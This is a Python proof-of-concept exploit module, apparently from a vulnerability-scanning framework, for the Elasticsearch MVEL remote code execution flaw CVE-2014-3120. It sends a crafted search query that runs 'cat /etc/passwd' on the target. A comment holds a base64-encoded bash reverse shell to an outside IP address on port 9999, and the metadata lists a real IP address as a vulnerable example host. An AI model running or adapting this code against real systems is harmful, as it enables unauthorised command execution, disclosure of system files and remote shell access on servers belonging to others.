# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

import json  
# ...
import urllib3
urllib3.disable_warnings()


class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-08",        # POC创建时间
        "UpdateDate" : "2021-06-08",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "ElasticSearch 命令执行漏洞（CVE-2014-3120）",                        # 漏洞名称
        "VulnID" : "CVE-2014-3120",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Elasticsearch",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2020-12-29",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
        "VulnDesc" : """
        老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，可以直接执行任意代码。
        """,                                # 漏洞简要描述

        "fofa-dork":"",                     # fofa搜索语句
        "example" : "http://207.192.69.193:9200",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 20

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        
        host = self.target.replace("elastic://","http://")
        url = host + "/website/blog/" # url自己按需调整
        url1 = host + "/_search?pretty" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        headers1 = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/text",
                    }
        data = "{\"name\": \"test\"}"
        data1 = """{
        "size": 1,
        "query": {
        "filtered": {
            "query": {
            "match_all": {
            }
            }
        }
        },
        "script_fields": {
            "command": {
                "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"cat /etc/passwd\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"
            }
        }
    }"""
    # bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNC4yMDUuMTk5Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.post(url = url, data = data , headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)
            req1 = requests.post(url = url1, data = data1 , headers = headers1 , proxies = self.proxy , timeout = self.timeout,verify = False)
            # if req.status_code == 200:
            if req1.status_code == 200 and "root:/root" in req1.text :
                vuln = [True,req1.text]
            else:
                vuln = [False,req1.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln


    def _attack(self):
        return self._verify()